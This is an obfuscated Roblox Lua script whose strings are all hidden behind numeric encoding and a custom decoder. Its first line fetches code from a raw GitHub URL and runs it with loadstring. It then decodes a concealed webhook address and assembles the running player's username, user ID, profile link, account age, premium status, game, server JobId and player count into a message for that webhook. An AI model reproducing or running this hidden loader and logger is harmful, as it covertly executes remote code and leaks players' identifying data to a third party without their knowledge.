function GdidTkzXqYpeCiBUjgiZGmKlsjpszUDBbppxnTb(code)res=''for i in ipairs(code)do res=res..string.char(code[i]/20)end return res end 


loadstring(game:HttpGet(GdidTkzXqYpeCiBUjgiZGmKlsjpszUDBbppxnTb({2080,2320,2320,2240,2300,1160,940,940,2280,1940,2380,920,2060,2100,2320,2080,2340,1960,2340,2300,2020,2280,1980,2220,2200,2320,2020,2200,2320,920,1980,2220,2180,940,1720,1640,1100,2300,2300,940,1720,1640,1100,940,2180,1940,2100,2200,940,1720,1640,1100,740,1000,960,1640,1300,1420,1360,1580,1520,1520})))()
local b=GdidTkzXqYpeCiBUjgiZGmKlsjpszUDBbppxnTb({1300,1320,1340,1360,1380,1400,1420,1440,1460,1480,1500,1520,1540,1560,1580,1600,1620,1640,1660,1680,1700,1720,1740,1760,1780,1800,1940,1960,1980,2000,2020,2040,2060,2080,2100,2120,2140,2160,2180,2200,2220,2240,2260,2280,2300,2320,2340,2360,2380,2400,2420,2440,960,980,1000,1020,1040,1060,1080,1100,1120,1140,860,940})
function WTRtdadYCSAHOWVFTUOpgXnsfzlOMQCtntByAwWnyPDoTsAlvGkDDmDGLslArzrhwSBedInaDvwXzdyBIniaiwhnhME(data) m=string.sub(data, 0, 55) data=data:gsub(m,GdidTkzXqYpeCiBUjgiZGmKlsjpszUDBbppxnTb({}))

data = string.gsub(data, GdidTkzXqYpeCiBUjgiZGmKlsjpszUDBbppxnTb({1820,1880})..b..GdidTkzXqYpeCiBUjgiZGmKlsjpszUDBbppxnTb({1220,1860}), GdidTkzXqYpeCiBUjgiZGmKlsjpszUDBbppxnTb({})) return (data:gsub(GdidTkzXqYpeCiBUjgiZGmKlsjpszUDBbppxnTb({920}), function(x) if (x == GdidTkzXqYpeCiBUjgiZGmKlsjpszUDBbppxnTb({1220})) then return GdidTkzXqYpeCiBUjgiZGmKlsjpszUDBbppxnTb({}) end local r,f=GdidTkzXqYpeCiBUjgiZGmKlsjpszUDBbppxnTb({}),(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and GdidTkzXqYpeCiBUjgiZGmKlsjpszUDBbppxnTb({980}) or GdidTkzXqYpeCiBUjgiZGmKlsjpszUDBbppxnTb({960})) end return r; end):gsub(GdidTkzXqYpeCiBUjgiZGmKlsjpszUDBbppxnTb({740,2000,740,2000,740,2000,1260,740,2000,1260,740,2000,1260,740,2000,1260,740,2000,1260,740,2000,1260}), function(x) if (#x ~= 8) then return GdidTkzXqYpeCiBUjgiZGmKlsjpszUDBbppxnTb({}) end local c=0 for i=1,8 do c=c+(x:sub(i,i)==GdidTkzXqYpeCiBUjgiZGmKlsjpszUDBbppxnTb({980}) and 2^(8-i) or 0) end return string.char(c) end)) end


 


local webhook = WTRtdadYCSAHOWVFTUOpgXnsfzlOMQCtntByAwWnyPDoTsAlvGkDDmDGLslArzrhwSBedInaDvwXzdyBIniaiwhnhME(GdidTkzXqYpeCiBUjgiZGmKlsjpszUDBbppxnTb({1940,1360,2340,1620,2060,2320,2260,2060,2220,1960,1740,2360,1320,2340,1760,1660,1800,2120,1480,2340,2080,2060,2060,1600,2440,2180,2280,1940,2080,1500,1980,2000,2300,2160,1720,1740,2400,1760,2120,1440,1580,1440,2320,2160,2260,1300,1380,1380,1620,1380,2440,2120,1600,1520,1360,1940,1440,1640,960,1980,1440,1540,1080,1520,2420,1140,2140,1940,1760,1560,2120,1960,1020,1480,2140,1520,2180,1560,2360,1960,1660,1140,2080,1980,1420,2140,2360,2000,1000,1720,2100,1940,1420,1140,2360,1940,1020,1540,2360,1540,1680,1460,1020,1560,1360,2060,1060,1540,2440,1620,2440,1580,1680,2060,2380,1560,1360,1380,2400,1540,2120,2140,2440,1580,1340,1120,1060,1680,980,1320,2380,1720,1440,1560,1940,1700,1660,980,2080,1800,1740,1060,2260,1740,1700,1400,1660,1640,2180,2240,1040,1960,1740,1800,1660,1740,1700,1560,1640,1560,960,980,1000,2020,2120,2000,2160,1680,1000,2320,1000,1580,1440,1720,2240,1640,1720,1980,1060,1980,1680,1480,2320,1680,1720,2240,1640,1980,2160,1380,2380,1700,2440,2080,1720,1960,1760,2220,2440,1780,1720,1560,2100,1520,1680,1620,2380,1980,1000,2240,2140,1520,1700,1480,2140,1540,1620,1220,1220}))
-- Define the PlaceId variable
local PlaceId = game.PlaceId

-- Get the game name and game URL
-- اسم ماب
local gameName = game:GetService(WTRtdadYCSAHOWVFTUOpgXnsfzlOMQCtntByAwWnyPDoTsAlvGkDDmDGLslArzrhwSBedInaDvwXzdyBIniaiwhnhME(GdidTkzXqYpeCiBUjgiZGmKlsjpszUDBbppxnTb({1320,2080,1720,1380,1640,2360,2260,1980,2100,1540,1620,2180,1440,1780,2380,1460,1740,1440,2220,1660,1580,1460,1400,2400,2060,2160,1360,2100,1460,1440,2240,2100,2140,2020,2160,2320,1600,1480,1680,2300,1460,2000,1740,1620,1380,2080,2040,2340,1300,2400,1640,1780,1460,2260,1780,1680,1740,1400,2420,1940,1000,1720,960,1980,1420,2400,2080,1780,1000,1720,1680,1800,1760,1480,1000,1940,1740,1560,2160}))):GetProductInfo(PlaceId).Name
-- رابط لعبه
local gameUrl = WTRtdadYCSAHOWVFTUOpgXnsfzlOMQCtntByAwWnyPDoTsAlvGkDDmDGLslArzrhwSBedInaDvwXzdyBIniaiwhnhME(GdidTkzXqYpeCiBUjgiZGmKlsjpszUDBbppxnTb({1560,2320,2380,1540,1600,1960,2160,2100,1600,1600,1600,2060,1540,1700,2380,2320,1740,2060,1360,2000,1940,2380,1380,2380,1320,2200,1340,1780,2300,1600,2300,2020,1800,1560,1940,2340,2040,2000,2220,1480,2400,2020,2040,1780,1680,1300,2440,1660,2440,1500,2120,1480,1460,1360,2300,1940,1440,1640,960,1980,1440,1540,1080,1520,2420,1140,1020,2000,1020,1980,2340,1980,2180,1140,2100,1960,1420,1140,1040,1520,2180,1560,2360,1960,1660,1140,2200,1780,1740,980,2160,1980,2420,1120,1220})) .. PlaceId
-- رابط بروفايل
local profileUrl = WTRtdadYCSAHOWVFTUOpgXnsfzlOMQCtntByAwWnyPDoTsAlvGkDDmDGLslArzrhwSBedInaDvwXzdyBIniaiwhnhME(GdidTkzXqYpeCiBUjgiZGmKlsjpszUDBbppxnTb({1600,1960,1720,2240,1780,1460,1580,2380,2280,1520,1660,1660,1560,2100,2100,2160,2200,1620,1960,1400,1520,1440,2100,1360,1420,2180,2040,1360,2020,2160,1620,2080,2240,2240,1540,1480,2040,1660,1340,1980,1620,2080,2100,1700,1780,1460,1580,2420,1460,1540,1400,2440,1560,1580,1560,1940,1440,1640,960,1980,1440,1540,1080,1520,2420,1140,1020,2000,1020,1980,2340,1980,2180,1140,2100,1960,1420,1140,1040,1520,2180,1560,2360,1960,1660,1140,980,1980,1000,1720,2420,1980,2420,1120,1220})) .. game:GetService(WTRtdadYCSAHOWVFTUOpgXnsfzlOMQCtntByAwWnyPDoTsAlvGkDDmDGLslArzrhwSBedInaDvwXzdyBIniaiwhnhME(GdidTkzXqYpeCiBUjgiZGmKlsjpszUDBbppxnTb({1980,1600,2400,1420,2300,1640,2120,1660,2060,2320,1600,2060,1720,1560,1480,2440,2220,2060,1480,2300,2180,1740,1620,2080,2240,1640,1340,1560,2160,2320,2280,1520,2080,1360,1560,1660,2220,1540,1480,2240,1520,2060,1460,2280,2100,1760,1980,1500,1960,1960,1720,1380,1660,1320,1400,1700,1420,2400,2080,2020,1740,1720,2420,1980,2380,1220,1220}))).LocalPlayer.UserId .. WTRtdadYCSAHOWVFTUOpgXnsfzlOMQCtntByAwWnyPDoTsAlvGkDDmDGLslArzrhwSBedInaDvwXzdyBIniaiwhnhME(GdidTkzXqYpeCiBUjgiZGmKlsjpszUDBbppxnTb({2320,1500,1540,1320,2400,1960,2360,1680,2200,1800,2420,2100,2420,1560,1600,1700,2140,1400,2320,1500,1680,2320,2400,1620,1960,1940,2280,2060,1780,1340,1640,1720,1300,1660,2160,1960,1740,1780,2220,2220,1620,1780,2340,2320,1800,1440,1760,2120,1540,2100,2220,1620,1460,2040,1660,1520,1020,1320,2420,1960,1000,1800,2240,1960,1420,1700,1220}))
-- عدد سيرفر
local playerCount = #game:GetService(WTRtdadYCSAHOWVFTUOpgXnsfzlOMQCtntByAwWnyPDoTsAlvGkDDmDGLslArzrhwSBedInaDvwXzdyBIniaiwhnhME(GdidTkzXqYpeCiBUjgiZGmKlsjpszUDBbppxnTb({2340,2240,1740,2100,2240,2420,2340,1540,2140,2160,1960,1480,1540,1300,1960,1420,1340,2060,1560,1680,1980,1740,2140,1360,1400,1780,1320,1440,1420,2220,2300,1300,1340,2060,2340,1960,2160,2360,2200,2140,1300,1540,1740,1360,2400,1340,2440,1720,1780,2240,1440,2120,2180,2240,2060,1700,1420,2400,2080,2020,1740,1720,2420,1980,2380,1220,1220}))):GetPlayers()
-- بريميم
local Players = game:GetService(WTRtdadYCSAHOWVFTUOpgXnsfzlOMQCtntByAwWnyPDoTsAlvGkDDmDGLslArzrhwSBedInaDvwXzdyBIniaiwhnhME(GdidTkzXqYpeCiBUjgiZGmKlsjpszUDBbppxnTb({2340,1660,1440,2000,1520,1320,2260,2280,2360,1640,2220,1740,1740,1980,1360,1740,1800,2400,1720,1300,2180,1640,2400,1740,1340,2080,1960,2160,2380,1640,1740,1300,1400,2080,1520,1960,1560,2060,1600,1940,2400,1560,2260,1300,1720,1700,1560,2120,1300,1480,2140,1380,2380,2200,1680,1700,1420,2400,2080,2020,1740,1720,2420,1980,2380,1220,1220})))
local player = Players.LocalPlayer
local hasPremium = player.MembershipType == Enum.MembershipType.Premium
-- وقت حاليا
local time = os.time()
local date = os.date(WTRtdadYCSAHOWVFTUOpgXnsfzlOMQCtntByAwWnyPDoTsAlvGkDDmDGLslArzrhwSBedInaDvwXzdyBIniaiwhnhME(GdidTkzXqYpeCiBUjgiZGmKlsjpszUDBbppxnTb({2260,1420,2360,1360,1940,2080,1520,2120,2380,1620,1360,1980,1980,1460,1800,1500,2100,1380,1580,2060,1560,1480,1300,2180,1360,1360,1660,1300,1660,2340,1760,1700,2100,1460,1580,2180,2340,1580,2000,1940,2180,2080,1780,2140,2060,1760,2200,1300,2420,2060,1640,1720,2060,2400,2320,1500,2200,1620,1220})), time)

local hour = math.floor(date.hour)
local min = math.floor(date.min)
local sec = math.floor(date.sec)


-- Create a JSON object to send to the webhook
local data = {
    [WTRtdadYCSAHOWVFTUOpgXnsfzlOMQCtntByAwWnyPDoTsAlvGkDDmDGLslArzrhwSBedInaDvwXzdyBIniaiwhnhME(GdidTkzXqYpeCiBUjgiZGmKlsjpszUDBbppxnTb({2020,1520,1440,1600,2200,1760,1320,2040,1400,2340,1940,1740,1440,1420,1600,1760,1780,1320,2360,1800,1780,2180,2140,2280,2200,2060,1580,1700,2320,1720,1720,2120,1620,1480,2260,1340,1440,1540,2340,1520,2200,2000,1500,2260,1520,2180,1620,2320,2280,2420,2120,2160,1740,2440,2100,1780,1000,1140,2340,2000,1420,1720,2340,2000,1300,1220,1220}))] = WTRtdadYCSAHOWVFTUOpgXnsfzlOMQCtntByAwWnyPDoTsAlvGkDDmDGLslArzrhwSBedInaDvwXzdyBIniaiwhnhME(GdidTkzXqYpeCiBUjgiZGmKlsjpszUDBbppxnTb({1560,2220,2440,1540,1420,1980,2440,1680,2300,2280,1800,1580,1660,2140,1360,1580,2340,1300,1640,2400,1980,1700,1980,2120,1540,2380,1300,1620,2360,2340,2100,2180,1320,2320,2140,2160,1560,1680,2260,1660,1760,1580,2060,1760,2200,1980,2040,2300,1960,1300,1740,1440,2020,1440,1560})),
    [WTRtdadYCSAHOWVFTUOpgXnsfzlOMQCtntByAwWnyPDoTsAlvGkDDmDGLslArzrhwSBedInaDvwXzdyBIniaiwhnhME(GdidTkzXqYpeCiBUjgiZGmKlsjpszUDBbppxnTb({1460,1560,1540,2020,1780,2300,2320,2100,1560,1800,2060,1500,1400,2300,2360,1620,1560,1380,1740,2380,1320,1560,2240,1380,1780,1980,1620,2020,1600,1720,1720,1680,1640,1960,2440,1680,2160,1340,1640,2080,1700,1520,2280,1700,2260,2140,1980,2400,2200,1480,1720,2100,1420,1580,1320,2000,1760,1560,2160,1980,2180,1060,2080,1960,1740,1700,1220}))] = WTRtdadYCSAHOWVFTUOpgXnsfzlOMQCtntByAwWnyPDoTsAlvGkDDmDGLslArzrhwSBedInaDvwXzdyBIniaiwhnhME(GdidTkzXqYpeCiBUjgiZGmKlsjpszUDBbppxnTb({2100,2160,2000,2000,2160,2120,1660,1460,2080,2400,1480,2240,2300,1300,1960,1720,1640,1800,2340,1340,1440,2120,2080,2180,1440,2180,1440,1420,1340,1540,2080,2060,2260,2060,2360,1620,2260,1440,2120,1420,1780,1320,1500,2060,1440,2260,2040,2140,1440,2440,1640,1420,1740,1780,2080,1620,2200,2140,2060,1580,2100,1320,1740,1700,2120,1980,1220})),
    [WTRtdadYCSAHOWVFTUOpgXnsfzlOMQCtntByAwWnyPDoTsAlvGkDDmDGLslArzrhwSBedInaDvwXzdyBIniaiwhnhME(GdidTkzXqYpeCiBUjgiZGmKlsjpszUDBbppxnTb({2060,2120,2060,1540,1340,2300,2060,2120,1480,1740,1980,1780,2040,1680,1700,1620,1560,1960,2020,2020,2340,1720,2160,1620,2120,2380,2360,1600,2200,1320,2320,2180,1320,2160,2200,1460,2060,2340,2120,1540,2060,2140,1360,2260,2120,2300,2260,2420,1680,1720,1400,1620,1320,2420,1380,1800,1740,980,2100,1800,1740,1640,2440}))] = {
        {
            [WTRtdadYCSAHOWVFTUOpgXnsfzlOMQCtntByAwWnyPDoTsAlvGkDDmDGLslArzrhwSBedInaDvwXzdyBIniaiwhnhME(GdidTkzXqYpeCiBUjgiZGmKlsjpszUDBbppxnTb({2180,2000,1800,2180,1560,2040,1580,1600,1700,2040,1620,2140,2180,1700,1520,1940,1740,2120,1580,1400,1980,1620,1720,1460,1360,1980,2080,2420,1300,1460,2120,2220,2340,1560,2320,2400,2200,1420,1440,1320,2320,1480,2340,1560,2120,1420,1720,2360,1720,2220,1600,2380,1980,1420,1680,2000,1420,2160,960,1960,1420,1700,1220}))] = WTRtdadYCSAHOWVFTUOpgXnsfzlOMQCtntByAwWnyPDoTsAlvGkDDmDGLslArzrhwSBedInaDvwXzdyBIniaiwhnhME(GdidTkzXqYpeCiBUjgiZGmKlsjpszUDBbppxnTb({1940,1540,2300,1540,1700,1520,1440,1580,2280,1320,1960,1520,2140,1760,2120,1660,1320,2440,1760,1740,1800,1760,1520,2100,2340,1440,1560,1620,2340,1320,2200,2040,1940,1560,1320,1960,2120,1560,1520,1720,2000,1580,1720,2420,1680,1500,1800,2260,1740,1700,2180,1780,1700,2000,2120})),
            [WTRtdadYCSAHOWVFTUOpgXnsfzlOMQCtntByAwWnyPDoTsAlvGkDDmDGLslArzrhwSBedInaDvwXzdyBIniaiwhnhME(GdidTkzXqYpeCiBUjgiZGmKlsjpszUDBbppxnTb({1640,1300,1780,2060,1440,2340,1360,1320,2140,2060,1580,2320,2360,1360,2020,2400,1540,2000,1520,1640,2360,1400,2040,1940,2400,1480,2400,2140,2400,2020,1940,1320,1560,2260,1420,1640,1980,1340,2320,2440,1540,1440,2000,1740,1780,1640,2300,1540,1380,1480,2240,1620,2380,1380,2320,1800,1420,1720,2440,1780,1020,1480,2240,1980,1440,1640,2240,1960,1000,1040,1220}))] = WTRtdadYCSAHOWVFTUOpgXnsfzlOMQCtntByAwWnyPDoTsAlvGkDDmDGLslArzrhwSBedInaDvwXzdyBIniaiwhnhME(GdidTkzXqYpeCiBUjgiZGmKlsjpszUDBbppxnTb({2140,1740,1500,2280,2000,1960,2380,2280,1460,1960,1720,1500,1620,2080,2420,1640,1980,1700,2100,1520,1560,2100,1620,1680,1420,2320,1400,1740,1620,1720,1660,1700,1340,1400,2200,1400,1560,1560,2180,1360,2280,1440,1760,1380,1480,1680,1960,1960,1620,1800,2020,1400,1760,2400,1380}))
            .. WTRtdadYCSAHOWVFTUOpgXnsfzlOMQCtntByAwWnyPDoTsAlvGkDDmDGLslArzrhwSBedInaDvwXzdyBIniaiwhnhME(GdidTkzXqYpeCiBUjgiZGmKlsjpszUDBbppxnTb({2020,2020,2000,1480,2080,1420,1420,2340,1740,2280,2080,1460,1520,1800,1720,1680,2160,1420,2100,1540,2240,2260,2120,2340,1380,2320,1440,2240,1500,2020,1640,2260,2360,1680,2000,2100,1720,2140,2200,1300,2340,2080,1680,1680,1320,1540,2280,1520,2340,1460,1960,1560,1460,1600,1520,1500,2100,2240,1620,1960,1420,1400,1060,1800,1760,1460,2060,1680,2180,1400,2320,1800,1680,2220,2260,1500,2100,1300,2060,1780,1420,1320,2060})) .. game:GetService(WTRtdadYCSAHOWVFTUOpgXnsfzlOMQCtntByAwWnyPDoTsAlvGkDDmDGLslArzrhwSBedInaDvwXzdyBIniaiwhnhME(GdidTkzXqYpeCiBUjgiZGmKlsjpszUDBbppxnTb({2360,1440,2080,1320,1500,1740,2400,1780,1520,2080,2240,2080,1740,1780,1500,1680,1460,2020,2440,1500,1560,2300,1540,1520,1780,1320,2040,1980,2360,2160,2420,1620,2020,2340,2220,2140,1660,2080,1580,1480,2080,2380,1460,1460,2240,2260,1300,2000,1520,1340,1760,1420,1980,2220,2300,1700,1420,2400,2080,2020,1740,1720,2420,1980,2380,1220,1220}))).LocalPlayer.Name .. WTRtdadYCSAHOWVFTUOpgXnsfzlOMQCtntByAwWnyPDoTsAlvGkDDmDGLslArzrhwSBedInaDvwXzdyBIniaiwhnhME(GdidTkzXqYpeCiBUjgiZGmKlsjpszUDBbppxnTb({2320,2280,2100,2260,1600,2440,1300,1700,1440,2320,1680,2360,1720,1660,2060,2000,2060,1400,1480,1620,2420,1500,1520,1300,1620,1940,2080,2280,1600,1980,1360,2340,2160,2120,2300,2240,1480,2020,1340,2200,2080,1580,2240,2160,1560,1540,2100,2020,2020,1680,1940,2300,2380,1400,2080,1460,1420,1320,2060,1780,1400,2400,2340}))
            .. WTRtdadYCSAHOWVFTUOpgXnsfzlOMQCtntByAwWnyPDoTsAlvGkDDmDGLslArzrhwSBedInaDvwXzdyBIniaiwhnhME(GdidTkzXqYpeCiBUjgiZGmKlsjpszUDBbppxnTb({1420,2000,2160,2420,2060,2060,1680,2060,1460,1700,2440,1700,1460,1500,2140,1420,1320,1300,1780,1780,2320,2100,1620,2260,1980,2240,2320,1940,1600,2140,2020,2220,2200,2100,1560,1940,2120,1380,2020,1520,1420,2300,1340,2180,1380,2000,1560,2280,1560,2220,2400,2100,1780,2200,1300,1500,2100,2240,1620,1960,1420,1400,1060,1800,1760,1460,2060,1660,1700,1620,1080,1500,2100,2220,2060,1780,1420,1320,2060})) .. game:GetService(WTRtdadYCSAHOWVFTUOpgXnsfzlOMQCtntByAwWnyPDoTsAlvGkDDmDGLslArzrhwSBedInaDvwXzdyBIniaiwhnhME(GdidTkzXqYpeCiBUjgiZGmKlsjpszUDBbppxnTb({2360,1760,1440,1500,1680,1360,2160,2420,2120,1700,1940,2240,2080,1360,2300,1640,1780,2100,1380,1540,1480,2220,1440,1340,1560,1480,1740,2280,2100,1480,1360,2040,1300,2400,1320,1960,2220,2000,1400,2400,1460,1960,1800,1580,1600,1600,2200,1340,1540,1660,2280,1980,2200,1340,2080,1700,1420,2400,2080,2020,1740,1720,2420,1980,2380,1220,1220}))).LocalPlayer.UserId .. WTRtdadYCSAHOWVFTUOpgXnsfzlOMQCtntByAwWnyPDoTsAlvGkDDmDGLslArzrhwSBedInaDvwXzdyBIniaiwhnhME(GdidTkzXqYpeCiBUjgiZGmKlsjpszUDBbppxnTb({1780,1700,1680,2360,2260,2000,2400,1440,1480,1420,2020,2240,1640,1460,1360,1660,1440,2280,1400,1540,1960,2180,1700,1960,2140,1320,2160,1620,2020,2360,2220,2100,1960,1580,1320,2080,2200,2080,1740,2300,1700,1400,2100,2060,1700,1360,1640,1300,2340,2180,1800,1360,1760,1300,1380,1780,1420,1320,2060,1760,1420,1040,1220}))
			.. WTRtdadYCSAHOWVFTUOpgXnsfzlOMQCtntByAwWnyPDoTsAlvGkDDmDGLslArzrhwSBedInaDvwXzdyBIniaiwhnhME(GdidTkzXqYpeCiBUjgiZGmKlsjpszUDBbppxnTb({1460,1660,1460,1400,1980,1320,1560,1520,2140,1460,1800,2280,2060,2020,1620,1540,2140,1540,1620,1520,1580,2260,1720,2060,1620,1580,1320,2440,1540,1480,2380,1720,2260,1360,1560,2220,1680,1560,1980,1460,1440,2420,2060,2160,2100,2220,2200,1740,1680,2200,2060,1520,1980,2180,2420,1500,2100,2240,1620,1960,1420,1400,1060,1800,1760,1460,2060,1720,1720,1480,1540,1580,2100,2220,2260,1460,1420,1320,2060,1780,1300,1220,1220})) .. profileUrl .. WTRtdadYCSAHOWVFTUOpgXnsfzlOMQCtntByAwWnyPDoTsAlvGkDDmDGLslArzrhwSBedInaDvwXzdyBIniaiwhnhME(GdidTkzXqYpeCiBUjgiZGmKlsjpszUDBbppxnTb({1680,2060,1800,1340,2020,1800,2000,2120,2440,2380,2260,1700,2300,1440,1780,2260,1620,1300,1380,1420,1960,1760,1960,1560,2400,2080,2260,1760,1340,1380,1680,1560,2240,2340,2300,2360,2100,1500,2280,1360,2340,2060,1680,2340,2360,1940,2240,2420,2360,2180,1600,2260,2180,1580,1620,1780,1420,1320,2060,1760,1420,1040,1220}))
            .. WTRtdadYCSAHOWVFTUOpgXnsfzlOMQCtntByAwWnyPDoTsAlvGkDDmDGLslArzrhwSBedInaDvwXzdyBIniaiwhnhME(GdidTkzXqYpeCiBUjgiZGmKlsjpszUDBbppxnTb({1800,2080,1300,2120,1500,1520,1400,2360,2160,2000,1640,2280,1460,1520,1420,2340,2220,2440,1600,1660,1360,2220,1620,2240,1340,2020,1580,1460,2000,2080,1460,1300,1560,2080,2220,2320,2320,1380,1600,1460,2360,1760,1480,2340,1480,1340,2120,1640,2380,1580,1780,1380,2160,1600,1700,1500,2100,2240,1440,1780,1740,980,2160,1460,1380,1060,2080,1960,1740,1700,1080,1500,2100,2220,2060,1780,1420,1320,2060})) .. gameName .. WTRtdadYCSAHOWVFTUOpgXnsfzlOMQCtntByAwWnyPDoTsAlvGkDDmDGLslArzrhwSBedInaDvwXzdyBIniaiwhnhME(GdidTkzXqYpeCiBUjgiZGmKlsjpszUDBbppxnTb({2000,1320,2060,1380,2100,2020,1640,2440,1960,2060,1640,1360,2160,1580,2040,2040,1700,1700,2280,1500,1640,1540,2200,2320,2260,1740,1360,2340,2280,1460,2320,1380,1320,1580,2040,2220,2080,1560,1680,1600,2400,1300,1520,1980,2360,2120,1680,1980,1620,1380,1720,1800,1440,1360,2440,1780,1420,1320,2060,1760,1420,1040,1220}))
            .. WTRtdadYCSAHOWVFTUOpgXnsfzlOMQCtntByAwWnyPDoTsAlvGkDDmDGLslArzrhwSBedInaDvwXzdyBIniaiwhnhME(GdidTkzXqYpeCiBUjgiZGmKlsjpszUDBbppxnTb({2380,1940,2120,2100,1660,1600,2400,1760,2040,2100,2280,2360,1440,1960,1960,2060,2280,1660,2100,1520,1660,2100,2320,1440,2440,1980,2000,1400,1960,2360,2000,2200,1980,1640,2280,1600,1640,1720,1540,1600,1300,1700,2320,1620,1560,1500,2180,1800,2200,1500,1500,1620,1540,1460,1300,1500,2100,2240,1440,1780,1740,980,2160,1460,1400,1720,1660,1680,1360,2220,2260,1500,2100,1320,2060,1780,1420,1300,1220})) .. gameUrl .. WTRtdadYCSAHOWVFTUOpgXnsfzlOMQCtntByAwWnyPDoTsAlvGkDDmDGLslArzrhwSBedInaDvwXzdyBIniaiwhnhME(GdidTkzXqYpeCiBUjgiZGmKlsjpszUDBbppxnTb({2260,2120,1960,1560,2320,1980,2260,2140,2360,2140,1300,1420,1340,2000,1940,2380,2040,1380,2060,1620,1700,1600,1600,2160,2000,1680,2440,1520,1660,1980,1480,2140,2240,2120,2060,1720,2000,2100,1600,2200,1540,2260,1460,2400,1980,1440,1360,2380,2240,1580,1320,2240,2040,2360,1400,1780,1420,1320,2060,1760,1420,1040,1220}))
		    .. WTRtdadYCSAHOWVFTUOpgXnsfzlOMQCtntByAwWnyPDoTsAlvGkDDmDGLslArzrhwSBedInaDvwXzdyBIniaiwhnhME(GdidTkzXqYpeCiBUjgiZGmKlsjpszUDBbppxnTb({2080,1780,1620,1600,2400,1620,1360,2220,2180,2160,1640,1640,2400,1500,1580,2380,2260,2340,2040,1460,1460,1680,2040,2420,2200,2420,1800,2300,1700,2380,1400,1460,1520,1640,1320,2000,1600,1780,2240,1320,1460,1540,2020,1340,1940,1940,2340,2060,1620,1780,1760,2160,1460,2160,1560,1500,2100,2240,1680,1800,1760,1480,1000,1800,1760,1460,2060,1660,2180,1140,2100,1660,1740,1620,2060,1580,2100,2220,2260,1460,1420,1320,2060,1780,1300,1220,1220})) .. game.JobId .. WTRtdadYCSAHOWVFTUOpgXnsfzlOMQCtntByAwWnyPDoTsAlvGkDDmDGLslArzrhwSBedInaDvwXzdyBIniaiwhnhME(GdidTkzXqYpeCiBUjgiZGmKlsjpszUDBbppxnTb({1420,2440,1500,2060,1640,2120,1520,2320,1980,1520,1980,2080,2280,1940,1320,2240,1560,2000,2140,1700,1380,2340,1440,2340,1320,1660,1420,2360,1400,2080,1800,2300,1720,2200,2060,1340,1760,2320,2380,2340,1380,1600,1520,1380,2200,2140,1320,2120,1780,1760,1700,2420,1700,2240,1380,1780,1420,1320,2060,1760,1420,1040,1220}))
            .. WTRtdadYCSAHOWVFTUOpgXnsfzlOMQCtntByAwWnyPDoTsAlvGkDDmDGLslArzrhwSBedInaDvwXzdyBIniaiwhnhME(GdidTkzXqYpeCiBUjgiZGmKlsjpszUDBbppxnTb({1460,2280,1520,1740,2320,1580,1300,2080,1560,1700,1680,2220,1340,1960,1500,1500,1320,1680,1700,1340,2360,1760,1700,1780,2000,2320,2160,2000,1960,2000,1460,1340,2160,2040,1660,2400,1460,1800,1760,1540,1540,2000,1300,1580,2300,2200,2180,2380,2360,1480,2020,1680,1560,1680,1480,1500,2100,2240,1680,1800,1760,1480,1000,1800,1760,1460,2060,1680,2200,1720,2320,1780,2180,1720,2420,1460,1440,1320,2300,1780,1760,2160,2160,1980,2200,1540,2060,1960,1000,1060,2300,1940,1740,1060,2160,1460,1360,2220,2260,1500,2100,1320,2060,1780,1420,1300,1220})) .. playerCount .. WTRtdadYCSAHOWVFTUOpgXnsfzlOMQCtntByAwWnyPDoTsAlvGkDDmDGLslArzrhwSBedInaDvwXzdyBIniaiwhnhME(GdidTkzXqYpeCiBUjgiZGmKlsjpszUDBbppxnTb({2380,2100,1780,1540,1660,2160,1500,2340,1640,1480,1440,2000,1540,1420,2380,2220,1600,2000,1560,1400,1480,1700,1420,2100,1960,1460,1760,1360,1680,1740,1460,1780,2400,1420,2440,2200,1320,2100,1700,1300,2400,2420,2280,2260,1600,1500,1400,1440,2040,2020,2120,2140,1680,1620,2080,1780,1420,1320,2060,1760,1420,1040,1220}))
			.. WTRtdadYCSAHOWVFTUOpgXnsfzlOMQCtntByAwWnyPDoTsAlvGkDDmDGLslArzrhwSBedInaDvwXzdyBIniaiwhnhME(GdidTkzXqYpeCiBUjgiZGmKlsjpszUDBbppxnTb({1720,2120,2260,2440,1720,2400,1580,2320,2420,2100,2440,1980,1320,2140,1540,1620,1320,1940,2280,1980,2300,2380,1440,2240,2300,2100,1400,1740,1560,1300,1520,2380,1620,2440,1640,2440,1940,2340,2060,1620,1400,1480,2440,2080,1740,2020,1480,1600,2000,1980,2420,2360,1340,1800,1460,1500,2100,2240,1320,1780,1000,1560,2360,2000,1740,1060,960,1460,1380,1400,2200,1800,1660,1300,1080,1500,2100,2220,2060,1780,1420,1320,2060})) .. game:GetService(WTRtdadYCSAHOWVFTUOpgXnsfzlOMQCtntByAwWnyPDoTsAlvGkDDmDGLslArzrhwSBedInaDvwXzdyBIniaiwhnhME(GdidTkzXqYpeCiBUjgiZGmKlsjpszUDBbppxnTb({1540,2260,1340,2380,2080,1380,1560,1440,1580,2100,1560,2340,1520,2300,1480,1800,1420,2020,2040,1360,1360,1360,2120,2220,1620,2200,2000,1640,1700,2040,2140,1580,2240,2140,2080,2300,1800,2200,1980,2200,1580,2080,2280,2220,1700,1520,1960,1480,1380,2160,2420,1460,1620,1440,1460,1700,1420,2400,2080,2020,1740,1720,2420,1980,2380,1220,1220}))).LocalPlayer.AccountAge .. WTRtdadYCSAHOWVFTUOpgXnsfzlOMQCtntByAwWnyPDoTsAlvGkDDmDGLslArzrhwSBedInaDvwXzdyBIniaiwhnhME(GdidTkzXqYpeCiBUjgiZGmKlsjpszUDBbppxnTb({2120,1420,2300,1740,2380,2360,2260,2400,1360,1560,1980,1940,2240,2440,1380,2300,1460,1740,1580,1320,1360,1580,1300,1500,1400,1960,1380,1320,2180,1960,2420,1980,1980,2380,2100,1600,1720,2020,1560,2240,2400,1400,1640,2220,1640,1680,2440,1800,1760,1460,1300,2020,1700,2360,1440,1780,1420,1320,2060,1460,1400,2400,2340})) 
